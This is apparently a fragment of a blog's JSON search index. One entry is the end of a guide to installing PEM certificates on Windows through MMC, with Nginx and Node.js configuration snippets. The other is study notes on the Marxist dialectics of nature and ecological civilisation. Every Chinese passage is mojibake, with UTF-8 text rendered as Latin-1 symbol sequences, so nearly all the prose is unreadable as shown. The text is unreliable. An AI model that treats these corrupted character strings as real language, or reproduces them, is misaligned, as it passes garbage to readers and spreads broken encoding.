ç„¶åé€‰æ‹©ä½ éœ€è¦å®‰è£…çš„è¯ä¹¦å¯¼å…¥å³å¯ã€‚ æ–¹å¼ä¸‰ æ‰“å¼€â€œå¼€å§‹â€èœå•ï¼Œæœç´¢â€œmmcâ€å¹¶æ‰“å¼€â€œMicrosoft Management Consoleâ€ã€‚ ç‚¹å‡»â€œæ–‡ä»¶â€èœå•ï¼Œé€‰æ‹©â€œæ·»åŠ /åˆ é™¤ç®¡ç†å•å…ƒâ€ã€‚ åœ¨â€œå¯ç”¨çš„ç®¡ç†å•å…ƒâ€åˆ—è¡¨ä¸­ï¼Œé€‰æ‹©â€œè¯ä¹¦â€å¹¶ç‚¹å‡»â€œæ·»åŠ â€ã€‚ é€‰æ‹©â€œè®¡ç®—æœºå¸æˆ·â€å¹¶ç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ã€‚ é€‰æ‹©â€œæœ¬åœ°è®¡ç®—æœºâ€å¹¶ç‚¹å‡»â€œå®Œæˆâ€ã€‚ åœ¨â€œæ§åˆ¶å°æ ¹è¯ä¹¦å­˜å‚¨â€ä¸‹ï¼Œå³é”®ç‚¹å‡»â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€å¹¶é€‰æ‹©â€œæ‰€æœ‰ä»»åŠ¡â€ &gt; â€œå¯¼å…¥â€ã€‚ ç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ï¼Œæµè§ˆåˆ°æ‚¨çš„Pemè¯ä¹¦æ–‡ä»¶å¹¶é€‰æ‹©å®ƒã€‚ ç‚¹å‡»â€œä¸‹ä¸€æ­¥â€ï¼Œé€‰æ‹©â€œå°†æ‰€æœ‰è¯ä¹¦éƒ½æ”¾ç½®åœ¨ä¸‹åˆ—å­˜å‚¨ä¸­â€å¹¶ç‚¹å‡»â€œæµè§ˆâ€ã€‚ é€‰æ‹©â€œå—ä¿¡ä»»çš„æ ¹è¯ä¹¦é¢å‘æœºæ„â€å¹¶ç‚¹å‡»â€œç¡®å®šâ€ã€‚ ç‚¹å‡»â€œä¸‹ä¸€æ­¥â€å¹¶å®Œæˆè¯ä¹¦å®‰è£…ã€‚ 3. ä½¿ç”¨PEMè¯ä¹¦æ–‡ä»¶ ä¸€æ—¦æ‚¨å·²ç»å®‰è£…äº†PEMè¯ä¹¦ï¼Œæ‚¨å¯ä»¥å¼€å§‹ä½¿ç”¨å®ƒã€‚é€šå¸¸ï¼Œæ‚¨éœ€è¦åœ¨åº”ç”¨ç¨‹åºæˆ–æœåŠ¡çš„é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šPEMè¯ä¹¦çš„è·¯å¾„æˆ–åç§°ã€‚ä»¥ä¸‹æ˜¯ä¸€äº›ç¤ºä¾‹ï¼š 1234567ssl_certificate /path/to/your/cert.pem;// For Node.js serverconst server = https.createServer(&#123; key: fs.readFileSync(&#x27;server.key&#x27;), cert: fs.readFileSync(&#x27;server.cert&#x27;)&#125;); ä»¥Nginx WebæœåŠ¡å™¨å’ŒNode.jsæœåŠ¡å™¨ä¸ºä¾‹ï¼Œæ‚¨å¯ä»¥å°†PEMè¯ä¹¦æ–‡ä»¶è·¯å¾„æˆ–åç§°æŒ‡å®šä¸ºâ€œssl_certificateâ€æˆ–â€œcertâ€é€‰é¡¹çš„å€¼ã€‚ ç»“è®º åœ¨æœ¬æ–‡ä¸­ï¼Œæ‚¨å·²äº†è§£å¦‚ä½•å®‰è£…PEMè¯ä¹¦æ–‡ä»¶å¹¶åœ¨åº”ç”¨ç¨‹åºæˆ–æœåŠ¡ä¸­ä½¿ç”¨å®ƒä»¬ã€‚æ— è®ºæ‚¨è¦åœ¨å“ªä¸ªå¹³å°ä¸Šå®‰è£…PEMè¯ä¹¦ï¼Œéƒ½éœ€è¦æŒ‰ç…§ç›¸åº”çš„æ­¥éª¤æ¥æ‰§è¡Œã€‚","tags":[{"name":"ç½‘ç»œç¼–ç¨‹/è¯ä¹¦","slug":"ç½‘ç»œç¼–ç¨‹-è¯ä¹¦","permalink":"https://hodlyounger.github.io/tags/%E7%BD%91%E7%BB%9C%E7%BC%96%E7%A8%8B-%E8%AF%81%E4%B9%A6/"},{"name":"PEM","slug":"PEM","permalink":"https://hodlyounger.github.io/tags/PEM/"}],"categories":[{"name":"Z_æ‚è®°","slug":"Z-æ‚è®°","permalink":"https://hodlyounger.github.io/categories/Z-%E6%9D%82%E8%AE%B0/"}]},{"title":"è‡ªç„¶è¾©è¯æ³•","date":"2023-10-27T01:24:02.562Z","path":"Z_æ‚è®°/è‡ªç„¶è¾©è¯æ³•/","text":"æ¦‚è¿°ï¼šè‡ªç„¶è¾©è¯æ³• å‚è€ƒé“¾æ¥ï¼š2019è‡ªç„¶è¾©è¯æ³•è¯¾åæ€è€ƒé¢˜åŠç­”æ¡ˆ_æ–‡æ¡£ä¹‹å®¶ [toc] ç¬¬ä¸€ç«  è‡ªç„¶è¾©è¯æ³•ï¼ˆbyselfï¼‰ 1.å¦‚ä½•ç†è§£æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚ã€æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚å’Œè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„è¾©è¯å…³ç³»ï¼Ÿ ï¼ˆ1ï¼‰å¤ä»£æœ´ç´ è‡ªç„¶è§‚ä»¥ç›´è§‚æ€§ã€æ€è¾¨æ€§å’ŒçŒœæµ‹æ€§çš„æ–¹å¼ä»æ•´ä½“æŠŠæ¡è®¤è¯†è‡ªç„¶ç•Œçš„æœ¬æºå’Œå‘å±•ï¼Œä½†ç¼ºä¹ç³»ç»Ÿçš„ã€ä»¥å®éªŒä¸ºåŸºç¡€çš„ç§‘å­¦ä¾æ®ï¼Œå°¤å…¶æ˜¯å°†éç‰©è´¨æ€§çš„ä¸œè¥¿å½“åšé™äºç‰©è´¨ä¸–ç•Œçš„ç‹¬ç«‹å­˜åœ¨ï¼Œå¹¶è®¤ä¸ºç‰©è´¨ä¸–ç•Œæ˜¯å®ƒçš„æ´¾ç”Ÿç‰©ï¼Œä¸ºå”¯å¿ƒä¸»ä¹‰çš„äº§ç”Ÿæä¾›äº†å€Ÿå£ï¼Œæœ€ç»ˆå¯¼è‡´äººç±»è®¤è¯†çš„åˆ†åŒ–ã€‚ ï¼ˆ2ï¼‰æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„æ ¸å¿ƒæ˜¯è‡ªç„¶ç•Œç»å¯¹ä¸å˜ï¼Œè™½ç„¶åœ¨å®è¯ç§‘å­¦çš„åŸºç¡€ä¸Šç»§æ‰¿å’ŒåšæŒäº†å¤ä»£æœ´ç´ å”¯ç‰©ä¸»ä¹‰çš„æ€æƒ³ï¼Œä½†æ˜¯ä¸æ‡‚å¾—ä¸€èˆ¬ä¸ä¸ªåˆ«ã€è¿åŠ¨å’Œé™æ­¢ç­‰çš„è¾©è¯å…³ç³»ï¼Œä»¥ä¸€ç§ç‰‡é¢çš„ã€å­¤ç«‹çš„å’Œé™æ­¢çš„æ–¹æ³•è§‚å¯Ÿè‡ªç„¶ç•Œï¼ŒæŒ¤ä¸åŠ¨çš„è‡ªç„¶ç•Œçš„è¾©è¯æ³•ï¼Œè‡ªç„¶ä¸èƒ½å§å”¯ç‰©ä¸»ä¹‰åšæŒåˆ°åº•ã€‚ ï¼ˆ3ï¼‰è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶å…‹æœäº†ä»¥å¾€å“²å­¦è‡ªç„¶è§‚çš„ç¼ºé™·ï¼ŒåšæŒäº†ç‰©è´¨ä¸–ç•Œçš„å®¢è§‚å®åœ¨æ€§çš„å”¯ç‰©ä¸»ä¹‰ä¸€å…ƒè®ºåŸåˆ™ï¼Œçªå‡ºäº†ç‰©è´¨ä¸–ç•Œçš„æ•´ä½“æ€§å’ŒçŸ›ç›¾æ€§ï¼Œæç¤ºäº†ç‰©è´¨ä¸–ç•Œçš„æ™®éè”ç³»ï¼Œå¼ºè°ƒäº†äººç±»èµ·æºäºè‡ªç„¶ç•Œã€ä¾èµ–äºè‡ªç„¶å¹¶åœ¨æŠŠæ¡è‡ªç„¶ç•Œå‘å±•è§„å¾‹çš„åŸºç¡€ä¸Šèƒ½ç§»åŠ¨åœ°å’Œæ”¹é€ è‡ªç„¶ï¼Œå¼ºè°ƒäº†äººä¸è‡ªç„¶ç•Œçš„å’Œè°ç»Ÿä¸€ã€‚ 2.å¦‚ä½•ç†è§£ç³»ç»Ÿè‡ªç„¶è§‚ã€äººå·¥è‡ªç„¶è§‚å’Œç”Ÿæ€è‡ªç„¶è§‚çš„è¾©è¯å…³ç³»ï¼Ÿ ç¬¬ä¸€ï¼Œå®ƒä»¬éƒ½å›´ç»•äººä¸è‡ªç„¶ç•Œå…³ç³»çš„ä¸»é¢˜ï¼Œä¸°å¯Œå’Œå‘å±•äº†é©¬å…‹æ€æ³¨æ„è‡ªç„¶è§‚çš„æœ¬ä½“è®ºã€è®¤è¯†è®ºå’Œæ–¹æ³•è®ºï¼›å®ƒä»¬éƒ½åšæŒäººç±»ä¸è‡ªç„¶ç•Œã€äººå·¥è‡ªç„¶ç•Œå’Œå¤©ç„¶è‡ªç„¶ç•Œã€äººä¸ç”Ÿæ€ç³»ç»Ÿçš„è¾©è¯ç»Ÿä¸€ï¼Œéƒ½ä¸ºå®ç°å¯æŒç»­å‘å±•å’Œç”Ÿæ€æ–‡æ˜å»ºè®¾å¥ å®šäº†ç†è®ºåŸºç¡€ã€‚ ç¬¬äºŒï¼Œå®ƒä»¬åœ¨ç ”ç©¶äººä¸è‡ªç„¶ç•Œå…³ç³»çš„å„æ–¹é¢å„æœ‰å…¶ä¾§é‡ç‚¹ï¼›ç³»ç»Ÿè‡ªç„¶è§‚ä¸ºæ­£ç¡®è®¤è¯†å’Œå¤„ç†äººä¸è‡ªç„¶åœ°å…³ç³»æä¾›äº†æ–°çš„æ€ç»´æ–¹å¼ï¼Œäººå·¥è‡ªç„¶è§‚çªå‡ºå¹¶åæ€äº†äººçš„ä¸»ä½“æ€§å’Œåˆ›é€ æ€§ï¼›è‡ªç„¶ç”Ÿæ€é¦†ç«™åœ¨äººç±»æ–‡æ˜çš„ç«‹åœºï¼Œå¼ºè°ƒäº†äººä¸è‡ªç„¶ç•Œçš„åè°ƒä¸å‘å±•ã€‚ ç¬¬ä¸‰ï¼Œå®ƒä»¬åœ¨ç ”ç©¶äººä¸è‡ªç„¶ç•Œçš„å…³ç³»æ–¹é¢ç›¸äº’å…³è”ï¼›ç³»ç»Ÿè‡ªç„¶è§‚é€šè¿‡ç³»ç»Ÿæ€ç»´æ–¹å¼ï¼Œä¸ºäººå·¥è‡ªç„¶è§‚å’Œç”Ÿæ€è‡ªç„¶è§‚æä¾›äº†æ–¹æ³•è®ºåŸºç¡€ï¼›äººå·¥è‡ªç„¶è§‚é€šè¿‡çªå‡ºäººçš„ä¸»ä½“æ€§å’Œå®è·µæ€§ï¼Œä¸ºç³»ç»Ÿè‡ªç„¶è§‚å’Œç”Ÿæ€è‡ªç„¶è§‚æä¾›äº†è®¤è¯†è®ºå‰æï¼›ç”Ÿæ€è‡ªç„¶è§‚é€šè¿‡å¼ºè°ƒäººä¸è‡ªç„¶ç•Œçš„ç»Ÿä¸€æ€§ã€åè°ƒæ€§å…³ç³»ä¸ºç³»ç»Ÿè‡ªç„¶è§‚å’Œäººå·¥è‡ªç„¶è§‚æŒ‡æ˜äº†å‘å±•æ–¹å‘å’Œç›®æ ‡ã€‚ 3.å¦‚ä½•è®¤è¯†ç”Ÿæ€è‡ªç„¶è§‚å’Œç”Ÿæ€æ–‡æ˜å»ºè®¾ä¹‹é—´çš„è¾©è¯å…³ç³»ï¼Ÿ ç”Ÿæ€æ–‡æ˜æ˜¯äººç±»æ–‡æ˜çš„ä¸€ç§å½¢å¼ã€‚å®ƒä»¥å°Šé‡å’Œç»´æŠ¤ç”Ÿæ€ç¯å¢ƒä¸ºä¸»æ—¨ï¼Œä»¥å¯æŒç»­å‘å±•ä¸ºæ ¹æ®ï¼Œä»¥æœªæ¥äººç±»çš„ç»§ç»­å‘å±•ä¸ºç€çœ¼ç‚¹ã€‚äººç±»å¯¹ç”Ÿæ€æ–‡æ˜çš„æ¢ç´¢ï¼Œæ˜¯å¯¹äººä¸è‡ªç„¶å’Œè°å…³ç³»çš„è¡¨ç°ã€‚ç”Ÿæ€æ–‡æ˜ä¸ç”Ÿæ€è‡ªç„¶è§‚æœ‰ç€ç´§å¯†çš„è”ç³»ï¼Œç”Ÿæ€æ–‡æ˜æ˜¯ç”Ÿæ€è‡ªç„¶è§‚çš„åº”æœ‰ä¹‹ä¹‰ï¼Œç”Ÿæ€è‡ªç„¶è§‚å¯¹ç°ä»Šä¸–ç•Œç”Ÿæ€æ–‡æ˜å‘å±•åŠå®è·µæœ‰ç€å¹¿æ³›çš„æŒ‡å¯¼æ„ä¹‰ã€‚ç”Ÿæ€æ–‡æ˜çš„æå‡ºï¼Œæ˜¯äººä»¬å¯¹å¯æŒç»­å‘å±•é—®é¢˜è®¤è¯†æ·±åŒ–çš„å¿…ç„¶ç»“æœã€‚äººç±»é€šè¿‡éµå®ˆå¯æŒç»­æ€§ã€å…±åŒæ€§å’Œå…¬å¹³æ€§ç­‰åŸåˆ™ï¼Œé€šè¿‡å®æ–½èŠ‚èƒ½å‡æ’å’Œå‘å±•ä½ç¢³ç»æµï¼Œæ„å»ºå’Œè°ç¤¾ä¼šå’Œå»ºè®¾ç”Ÿæ€æ–‡æ˜ï¼Œå®ç°äººç±»ç¤¾ä¼šä¸ç”Ÿæ€ç³»ç»Ÿçš„åè°ƒå‘å±•ï¼›äººä¸ç”Ÿæ€ç³»ç»Ÿçš„åè°ƒå‘å±•ä»åº”ä»¥äººç±»ä¸ºä¸»ä½“ï¼Œä»åº”åŒ…æ‹¬æ”¹é€ è‡ªç„¶çš„å†…å®¹ï¼Œæ³¨é‡ä¿æŠ¤ç”Ÿæ€ç¯å¢ƒå’Œé˜²ç¾å‡ç¾ï¼›ç”Ÿæ€è‡ªç„¶ç•Œæ˜¯å¤©ç„¶è‡ªç„¶ç•Œå’Œäººå·¥è‡ªç„¶ç•Œçš„ç»Ÿä¸€ï¼Œæ˜¯äººç±»æ–‡æ˜å‘å±•çš„ç›®æ ‡ï¼Œç”Ÿæ€æ–‡æ˜çš„æå‡ºï¼Œæ˜¯äººä»¬å¯¹å¯æŒç»­å‘å±•é—®é¢˜è®¤è¯†æ·±åŒ–çš„å¿…ç„¶ç»“æœã€‚ç”Ÿæ€è‡ªç„¶è§‚æŒ‡å‡ºï¼Œäººä¸è‡ªç„¶éƒ½æ˜¯ç”Ÿæ€ç³»ç»Ÿä¸­ä¸å¯æˆ–ç¼ºçš„é‡è¦ç»„æˆéƒ¨åˆ†ï¼Œäººä¸è‡ªç„¶æ˜¯ç›¸äº’ä¾å­˜ã€å’Œè°å…±å¤„ã€å…±åŒä¿ƒè¿›çš„å…³ç³»ã€‚äººç±»çš„å‘å±•åº”è¯¥æ˜¯äººä¸ç¤¾ä¼šã€äººä¸ç¯å¢ƒã€å½“ä»£äººä¸åä»£äººçš„åè°ƒå‘å±•ã€‚äººç±»çš„å‘å±•ä¸ä»…è¦è®²ç©¶ä»£å†…å…¬å¹³ï¼Œè€Œä¸”è¦è®²ç©¶ä»£é™…ä¹‹é—´çš„å…¬å¹³ï¼Œä¸èƒ½ä»¥å½“ä»£äººçš„åˆ©ç›Šä¸ºä¸­å¿ƒï¼Œç”šè‡³ä¸ºäº†å½“ä»£äººçš„åˆ©ç›Šè€Œä¸æƒœç‰ºç‰²åä»£äººçš„åˆ©ç›Šã€‚è€Œå¿…é¡»è®²ç©¶ç”Ÿæ€æ–‡æ˜ï¼Œç‰¢å›ºæ ‘ç«‹èµ·å¯æŒç»­å‘å±•çš„ç”Ÿæ€æ–‡æ˜è§‚ã€‚ 4.å¦‚ä½•ç†è§£â€œç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€ï¼Ÿ ç®€å•çš„æ¥è¯´ï¼Œ&quot;ç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±â€å°±æ˜¯æŒ‡ç”Ÿæ€å¯æŒç»­å‘å±•ã€‚è“å¤©ç™½äº‘ã€é’å±±ç»¿æ°´æ˜¯äººç±»èµ–ä»¥ç”Ÿå­˜çš„ç¯å¢ƒï¼Œæ˜¯ç¤¾ä¼šé•¿è¿œå‘å±•çš„æœ€å¤§æœ¬é’±ï¼Œç”Ÿæ€ä¼˜åŠ¿å¯ä»¥å˜æˆç»æµä¼˜åŠ¿ã€å‘å±•ä¼˜åŠ¿ï¼Œå½¢æˆäº†ä¸€ç§æµ‘ç„¶ä¸€ä½“ã€å’Œè°ç»Ÿä¸€çš„å…³ç³»ã€‚å› æ­¤ä¿æŠ¤ç»¿æ°´é’å±±ï¼Œæ‰èƒ½ä¿ä½äººä»¬èµ–ä»¥ç”Ÿå­˜çš„ç”Ÿæ€ç¯å¢ƒï¼Œä»è€Œèµ¢å¾—é•¿è¿œçš„ç»æµå¯æŒç»­å‘å±•ã€‚ ä¹ è¿‘å¹³æ€»ä¹¦è®°å…³äºç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±çš„è¾©è¯è®ºæ˜¯ç”Ÿæ€ç¯å¢ƒç”Ÿäº§åŠ›ç†è®ºç”ŸåŠ¨ã€æœ´å®å’Œå¯Œå«å“²ç†çš„å°è¯ï¼šâ€œç»¿æ°´é’å±±å¯ä»¥æºæºä¸æ–­åœ°å¸¦æ¥é‡‘å±±é“¶å±±ï¼Œç»¿æ°´é’å±±æœ¬èº«å°±æ˜¯é‡‘å±±é“¶å±±ï¼Œæˆ‘ä»¬ç§çš„å¸¸é’æ ‘å°±æ˜¯æ‘‡é’±æ ‘ï¼Œç”Ÿæ€ä¼˜åŠ¿å˜æˆç»æµä¼˜åŠ¿ã€‚â€ â€œå¦‚æœèƒ½å¤ŸæŠŠè¿™äº›ç”Ÿæ€ç¯å¢ƒä¼˜åŠ¿è½¬åŒ–ä¸ºç”Ÿæ€å†œä¸šã€ç”Ÿæ€å·¥ä¸šã€ç”Ÿæ€æ—…æ¸¸ç­‰ç”Ÿæ€ç»æµçš„ä¼˜åŠ¿ï¼Œé‚£ä¹ˆç»¿æ°´é’å±±ä¹Ÿå°±å˜æˆäº†é‡‘å±±é“¶å±±ã€‚â€å½“ç„¶ï¼Œç»¿æ°´é’å±±å’Œé‡‘å±±é“¶ å±±ä¹‹é—´ä¹Ÿæœ‰çŸ›ç›¾ï¼Œç»¿æ°´é’å±±æ˜¯çœŸæ­£çš„é‡‘ä¸æ¢ï¼Œâ€œç»¿æ°´é’å±±å¯å¸¦æ¥é‡‘å±±é“¶å±±ï¼Œä½†é‡‘å±±é“¶å±±å´ä¹°ä¸åˆ°ç»¿æ°´é’å±±â€ã€‚ å› æ­¤ï¼Œå½“ç»¿æ°´é’å±±å’Œé‡‘å±±é“¶å±±ä¹‹é—´æœ‰ä¸å¯è°ƒå’Œçš„çŸ›ç›¾æ—¶ï¼Œæˆ‘ä»¬å®è¦ç»¿æ°´é’å±±ï¼Œä¸è¦é‡‘å±±é“¶å±±ã€‚è¦åƒå¯¹å¾…ç”Ÿå‘½ä¸€æ ·å¯¹å¾…ç”Ÿæ€ç¯å¢ƒï¼Œç»Ÿç­¹å±±æ°´æ—ç”°æ¹–è‰ç³»ç»Ÿæ²»ç†ï¼Œå®è¡Œæœ€ä¸¥æ ¼çš„ç”Ÿæ€ç¯å¢ƒä¿æŠ¤åˆ¶åº¦ï¼Œå½¢æˆç»¿è‰²å‘å±•æ–¹å¼å’Œç”Ÿæ´»æ–¹å¼ï¼Œåšå®šèµ°ç”Ÿäº§å‘å±•ã€ç”Ÿæ´»å¯Œè£•ã€ç”Ÿæ€è‰¯å¥½çš„æ–‡æ˜å‘å±•é“è·¯ï¼Œå»ºè®¾ç¾ä¸½ä¸­å›½ã€‚ ç»¿æ°´é’å±±å°±æ˜¯é‡‘å±±é“¶å±±çš„ç†å¿µï¼Œä¸€å¤´æ˜¯äººç±»èµ–ä»¥ç”Ÿå­˜çš„è‡ªç„¶ç¯å¢ƒï¼Œå¦ä¸€å¤´ç‰µç€è´¢å¯Œç”Ÿäº§ï¼›ä¸€å¤´è¿ç€ç”Ÿæ€ç¯å¢ƒï¼Œå¦ä¸€å¤´æ˜¯äººç±»æ´»åŠ¨çš„äº§ç‰©ã€‚ä»äººä¸è‡ªç„¶æ˜¯ç”Ÿå‘½å…±åŒä½“å‡ºå‘ï¼Œå°†ç”Ÿæ€ç¯å¢ƒå†…åŒ–ä¸ºç”Ÿäº§åŠ›çš„å†…ç”Ÿå˜é‡ä¸ä»·å€¼ç›®æ ‡ï¼Œè•´å«ç€å°Šé‡è‡ªç„¶ã€é¡ºåº”è‡ªç„¶ã€ä¿æŠ¤è‡ªç„¶ï¼Œè°‹æ±‚äººä¸è‡ªç„¶å’Œè°å‘å±•çš„ç”Ÿæ€ç†å¿µå’Œä»·å€¼è¯‰æ±‚ã€‚ æ­ç¤ºäº†ç”Ÿæ€ç¯å¢ƒä¸ç”Ÿäº§åŠ›ä¹‹é—´çš„è¾©è¯ç»Ÿä¸€å…³ç³»ï¼Œçªç ´äº†æŠŠä¿æŠ¤ç”Ÿæ€ä¸å‘å±•ç”Ÿäº§åŠ›å¯¹ç«‹èµ·æ¥çš„åƒµåŒ–æ€ç»´ï¼Œå†…å«äº†ä¿æŠ¤ã€æ”¹å–„ä¸å»ºè®¾ç”Ÿæ€ç¯å¢ƒå’Œä¿æŠ¤ä¸å‘å±•ç”Ÿäº§åŠ›çš„æœ‰æœºç»Ÿä¸€ï¼Œé²œæ´»åœ°æ¦‚æ‹¬äº†æœ‰ä¸­å›½æ°”æ´¾ã€ä¸­å›½é£æ ¼å’Œä¸­å›½è¯è¯­ç‰¹è‰²çš„ç»¿è‰²å‘å±•å†…æ¶µï¼Œæ˜¯ä¸­å›½åŒ–é©¬å…‹æ€ä¸»ä¹‰ç†è®ºçš„å…‰è¾‰å…¸èŒƒã€‚ ç¬¬ä¸€ç«  è‡ªç„¶è¾©è¯æ³• 1.å¦‚ä½•ç†è§£æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚ã€æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚å’Œè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„è¾©è¯å…³ç³»ï¼Ÿ æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æ˜¯å¤ä»£è‡ªç„¶å“²å­¦å®¶ä»¬ä»¥ç§‘å­¦æŠ€æœ¯ä¸ºåŸºç¡€ï¼Œæ¦‚æ‹¬å’Œæ€»ç»“è‡ªç„¶ç•ŒåŠå…¶ä¸äººç±»çš„å…³ç³»å½¢æˆçš„æ€»çš„è§‚ç‚¹ã€‚å®ƒæ˜¯é©¬å…‹æ€ä¸»ä¹‰è‡ªç„¶è§‚å½¢æˆçš„æœ€åˆæ€æƒ³æ¸Šæºã€‚å®ƒå…·æœ‰â‘ æ•´ä½“æ€§å’Œç›´è§‚æ€§ï¼Œâ‘¡æ€è¾¨æ€§å’Œè‡†æµ‹æ€§ï¼Œâ‘¢è‡ªå‘æ€§å’Œä¸å½»åº•æ€§ã€‚æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„æ€æƒ³æ¸Šæºæ˜¯åŸå§‹å®—æ•™ç¥è¯è‡ªç„¶è§‚ï¼Œå…¶ç†è®ºåŸºç¡€æ˜¯è‡ªç„¶å“²å­¦ã€‚æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚å…·æœ‰ä¸€å®šçš„ç¼ºé™·ï¼šâ‘ ä¸èƒ½å½»åº•åœ°åšæŒå”¯ç‰©ä¸»ä¹‰ï¼Œå…·æœ‰å”¯å¿ƒä¸»ä¹‰å› ç´ ï¼Œå¦‚æ³°å‹’æ–¯çš„&quot;æ°´æœ¬åŸè¯´â€â‘¡ä¸èƒ½æ»¡è¶³æ°‘ä¼—çš„éœ€è¦ï¼Œæºæ‚ç€å®¿å‘½å’Œè¿·ä¿¡ç­‰å› ç´ ã€‚â‘¢ä¸èƒ½ç§‘å­¦åœ°è¯´æ˜è‡ªç„¶ç•Œã€‚ æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æ˜¯è¿‘ä»£è‡ªç„¶ç§‘å­¦å®¶ä»¬ä»¥è¿‘ä»£ç§‘å­¦æŠ€æœ¯ä¸ºåŸºç¡€ï¼Œæ¦‚æ‹¬å’Œæ€»ç»“è‡ªç„¶ç•ŒåŠå…¶ä¸äººç±»çš„å…³ç³»å½¢æˆçš„æ€»çš„è§‚ç‚¹ã€‚å®ƒæ˜¯é©¬å…‹æ€ä¸»ä¹‰è‡ªç„¶è§‚å½¢æˆçš„é‡è¦æ€æƒ³æ¸Šæºã€‚å®ƒå…·æœ‰â‘ æœºæ¢°æ€§â‘¡ä¸å½»åº•æ€§â‘¢å½¢è€Œä¸Šå­¦æ€§ã€‚æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚â‘ ä¸ºè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å½¢æˆåˆ›é€ äº†æ¡ä»¶ã€‚ä»–ä»¥è¿‘ä»£è‡ªç„¶ç§‘å­¦ä¸ºåŸºç¡€ï¼Œå¼ºè°ƒè‡ªç„¶ç•Œå­˜åœ¨çš„å®¢è§‚æ€§ï¼Œç‰©è´¨æ€§å’Œå‘å±•çš„è§„å¾‹æ€§ï¼Œä¼ æ‰¿äº†æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„æ€æƒ³ä¼ ç»Ÿã€‚â‘¢ä¸ºè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å½¢æˆæä¾›äº†å‰æã€‚å®ƒæ‰€åŸ¹æ¤çš„å´‡å°šç†æ€§çš„ç§‘å­¦ç²¾ç¥ä¿ƒè¿›äº†è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å½¢æˆã€‚ è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æ˜¯é©¬å…‹æ€æ©æ ¼æ–¯ä»¥è¿‘ä»£ç§‘å­¦æŠ€æœ¯ä¸ºåŸºç¡€ï¼Œæ¦‚æ‹¬å’Œæ€»ç»“è‡ªç„¶ç•ŒåŠå…¶ä¸äººç±»å…³ç³»å½¢æˆçš„æ€»çš„è§‚ç‚¹ã€‚å®ƒæ˜¯é©¬å…‹æ€ä¸»ä¹‰è‡ªç„¶è§‚å½¢æˆçš„é‡è¦æ ‡å¿—ã€‚è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚å…·æœ‰â‘ å®è·µæ€§â‘¡å†å²æ€§â‘¢è¾©è¯æ€§â‘£æ‰¹åˆ¤æ€§ã€‚è¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚â€œæ‰¬å¼ƒâ€äº†æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚ï¼Œåœ¨æ›´é«˜å±‚æ¬¡ä¸Šå®ç°äº†å‘å¤å¸Œè…Šæœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å›å½’ã€‚ ä¸‰ç§è‡ªç„¶è§‚çš„å‘å±•æœ¬è´¨æ˜¯äººç±»è®¤è¯†çš„å‘å±•ï¼Œè¾©è¯å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚æ˜¯å¯¹æœ´ç´ å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å¦å®šä¹‹å¦å®šï¼Œæ˜¯å¯¹æœºæ¢°å”¯ç‰©ä¸»ä¹‰è‡ªç„¶è§‚çš„å¦å®šã€‚ä»»ä½•ä¸€ç§è‡ªç„¶è§‚çš„äº§ç”Ÿéƒ½è„±ç¦»ä¸äº†å½“æ—¶ç§‘å­¦çš„å‘å±•æ°´å¹³ï¼Œä¹Ÿç¦»ä¸å¼€äººä»¬çš„è®¤è¯†æ°´å¹³ã€‚è€Œæ›´å…ˆè¿›çš„è‡ªç„¶è§‚å¯¹ç§‘å­¦çš„å‘å±•åˆå…·æœ‰æŒ‡å¯¼æ€§æ„ä¹‰ã€‚è¿™ä¸ªå‘å±•æ˜¯èºæ—‹ä¸Šå‡çš„ï¼Œåœ¨æˆ‘ä»¬çš„è®¤è¯†ä¸­è¿˜ä¼šè¿›è¡Œè¡¥å……å’Œä¸°å¯Œï¼Œåœ¨è¿åŠ¨ä¸­å‘å±•è‡ªå·±ã€‚ 2.å¦‚ä½•ç†è§£ç³»ç»Ÿè‡ªç„¶è§‚ã€äººå·¥è‡ªç„¶è§‚å’Œç”Ÿæ€è‡ªç„¶è§‚çš„è¾©è¯å…³ç³»ï¼Ÿ P42 3.å¦‚ä½•è®¤è¯†ç”Ÿæ€è‡ªç„¶è§‚å’Œç”Ÿæ€æ–‡æ˜å»ºè®¾ä¹‹é—´çš„è¾©è¯å…³ç³»ï¼Ÿ ç”Ÿæ€æ–‡æ˜æ˜¯äººç±»æ–‡æ˜çš„ä¸€ç§å½¢å¼ã€‚å®ƒä»¥å°Šé‡å’Œç»´æŠ¤ç”Ÿæ€ç¯å¢ƒä¸ºä¸»æ—¨ï¼Œä»¥å¯æŒç»­å‘å±•ä¸ºæ 